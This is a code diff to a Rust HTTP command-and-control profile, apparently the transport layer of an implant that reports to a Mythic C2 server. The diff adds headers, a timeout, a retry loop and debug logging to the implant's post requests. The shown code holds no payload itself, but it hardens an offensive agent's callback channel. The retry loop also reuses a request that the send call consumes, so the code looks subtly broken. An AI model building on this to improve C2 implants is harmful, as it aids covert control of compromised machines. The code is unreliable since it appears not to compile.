@@ -53,9 +53,12 @@ impl C2Profile for HTTPProfile {
 /// * `url` - URL for the post request
 /// * `body` - Body of the post request
 fn http_post(url: &str, body: &str) -> Result<String, Box<dyn Error>> {
-    // Create a new post request with the configured user agent
+    // Create a new post request with the configured user agent and timeout
     let mut req = minreq::post(url)
         .with_header("User-Agent", profilevars::useragent())
+        .with_header("Content-Type", "application/json")
+        .with_header("Connection", "keep-alive")
+        .with_timeout(30) // 30 second timeout
         .with_body(body);
 
     // Add any additional headers
@@ -65,30 +68,75 @@ fn http_post(url: &str, body: &str) -> Result<String, Box<dyn Error>> {
         }
     }
 
-    // Send the post request
-    let res = match req.send() {
-        Ok(response) => response,
-        Err(e) => {
-            eprintln!("DEBUG: HTTP request failed to {}", url);
-            eprintln!("DEBUG: Error: {}", e);
-            return Err(std::io::Error::new(
-                std::io::ErrorKind::ConnectionRefused,
-                format!("Failed to make post request to {}: {}. Please check if the Mythic server is running and the URL is correct.", url, e),
-            )
-            .into());
+    // Send the post request with retry logic
+    let mut attempts = 0;
+    let max_attempts = 3;
+    
+    loop {
+        attempts += 1;
+        eprintln!("DEBUG: HTTP request attempt {} to {}", attempts, url);
+        
+        let res = match req.send() {
+            Ok(response) => {
+                eprintln!("DEBUG: HTTP request successful, status: {}", response.status_code);
+                response
+            },
+            Err(e) => {
+                eprintln!("DEBUG: HTTP request failed to {}: {}", url, e);
+                
+                if attempts >= max_attempts {
+                    return Err(std::io::Error::new(
+                        std::io::ErrorKind::ConnectionRefused,
+                        format!("Failed to make post request to {} after {} attempts: {}. Please check if the Mythic server is running and the URL is correct.", url, max_attempts, e),
+                    )
+                    .into());
+                }
+                
+                // Wait before retrying
+                eprintln!("DEBUG: Retrying in 2 seconds...");
+                std::thread::sleep(std::time::Duration::from_secs(2));
+                continue;
+            }
+        };
+
+        // Check the status code
+        if res.status_code != 200 {
+            if attempts >= max_attempts {
+                return Err(std::io::Error::new(
+                    std::io::ErrorKind::ConnectionRefused,
+                    format!("Failed to make post request to {}: HTTP {} - {}", url, res.status_code, res.reason_phrase),
+                )
+                .into());
+            }
+            
+            eprintln!("DEBUG: HTTP request failed with status {}, retrying...", res.status_code);
+            std::thread::sleep(std::time::Duration::from_secs(2));
+            continue;
         }
-    };
 
-    // Check the status code
-    if res.status_code != 200 {
-        return Err(std::io::Error::new(
-            std::io::ErrorKind::ConnectionRefused,
-            format!("Failed to make post request to {}: HTTP {} - {}", url, res.status_code, res.reason_phrase),
-        )
-        .into());
+        // Try to get the response body
+        match res.as_str() {
+            Ok(response_body) => {
+                eprintln!("DEBUG: HTTP response received, length: {} bytes", response_body.len());
+                return Ok(response_body.to_string());
+            },
+            Err(e) => {
+                eprintln!("DEBUG: Failed to read response body: {}", e);
+                
+                if attempts >= max_attempts {
+                    return Err(std::io::Error::new(
+                        std::io::ErrorKind::InvalidData,
+                        format!("Failed to read response body from {}: {}", url, e),
+                    )
+                    .into());
+                }
+                
+                eprintln!("DEBUG: Retrying due to response body read error...");
+                std::thread::sleep(std::time::Duration::from_secs(2));
+                continue;
+            }
+        }
     }
-
-    Ok(res.as_str()?.to_string())
 }
 
 /// Configuration variables specific to the HTTP C2 profile
